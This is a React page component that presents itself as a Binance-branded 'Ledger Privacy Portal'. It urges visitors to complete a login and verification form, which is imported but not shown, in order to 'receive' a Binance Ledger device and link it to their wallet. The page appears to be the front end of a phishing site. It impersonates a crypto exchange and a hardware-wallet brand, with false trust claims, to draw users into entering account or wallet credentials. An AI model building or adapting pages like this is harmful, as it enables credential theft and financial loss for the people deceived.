
import React from "react";
import BinanceHeader from "@/components/BinanceHeader";
import BinanceFooter from "@/components/BinanceFooter";
import BinanceLedgerForm from "@/components/BinanceLedgerForm";
import BinanceAppPromotion from "@/components/BinanceAppPromotion";

const Index = () => {
  return (
    <div className="min-h-screen flex flex-col bg-binance-dark text-white">
      <BinanceHeader />
      
      <main className="flex-grow">
        {/* Hero Section - made more compact */}
        <div className="bg-binance-black py-6 md:py-10 relative overflow-hidden">
          <div className="container mx-auto px-4">
            <div className="max-w-5xl mx-auto">
              <div className="flex flex-col items-center text-center relative z-10">
                <h1 className="text-2xl md:text-3xl lg:text-4xl font-bold mb-3 md:mb-4">
                  Binance Ledger <span className="text-binance-yellow">Privacy Portal</span>
                </h1>
                <p className="text-gray-300 text-sm md:text-base mb-4 md:mb-6 max-w-2xl px-2 md:px-0">
                  Secure your crypto assets with the most trusted hardware wallet in the industry
                </p>
                <div className="flex justify-center space-x-3 md:space-x-4 mb-4 md:mb-8">
                  <div className="w-8 md:w-12 h-px bg-binance-yellow my-auto"></div>
                  <span className="text-binance-yellow text-sm md:text-base px-2 md:px-4">Trusted by millions</span>
                  <div className="w-8 md:w-12 h-px bg-binance-yellow my-auto"></div>
                </div>
              </div>
            </div>
          </div>
          
          {/* Ledger Image positioned to overlap sections */}
          <div className="absolute right-0 top-1/2 transform -translate-y-1/2 z-20 hidden lg:block">
            <img 
              src="/lovable-uploads/c41e1819-05c2-4b68-babe-06fee72ca2a2.png" 
              alt="Binance Ledger Device" 
              className="max-w-md h-auto"
            />
          </div>
          
          {/* Tablet view for Ledger image */}
          <div className="hidden md:block lg:hidden absolute right-5 top-1/2 transform -translate-y-1/2 z-20">
            <img 
              src="/lovable-uploads/c41e1819-05c2-4b68-babe-06fee72ca2a2.png" 
              alt="Binance Ledger Device" 
              className="max-w-[250px] h-auto"
            />
          </div>
          
          {/* Mobile view for Ledger image - improved positioning as background element */}
          <div className="absolute inset-0 z-0 md:hidden flex items-center justify-center opacity-30">
            <img 
              src="/lovable-uploads/c41e1819-05c2-4b68-babe-06fee72ca2a2.png" 
              alt=""
              className="w-[300px] max-w-[80%] h-auto object-contain"
              aria-hidden="true"
            />
          </div>
        </div>
        
        {/* Form Section - reduced top padding on mobile */}
        <div className="container mx-auto px-2 sm:px-4 py-3 md:py-6 relative">
          <div className="max-w-4xl mx-auto mb-4 md:mb-8 pt-3 md:pt-4 px-2 md:px-0">
            <h2 className="text-xl md:text-2xl font-bold mb-2 md:mb-3">Ledger Verification Portal</h2>
            <p className="text-gray-300 text-sm md:text-base">
              Please complete the login and verification process below to receive your Binance Ledger device 
              and link it securely to your wallet.
            </p>
          </div>
          
          <BinanceLedgerForm />
        </div>
      </main>
      
      <BinanceFooter />
      <BinanceAppPromotion />
    </div>
  );
};

export default Index;
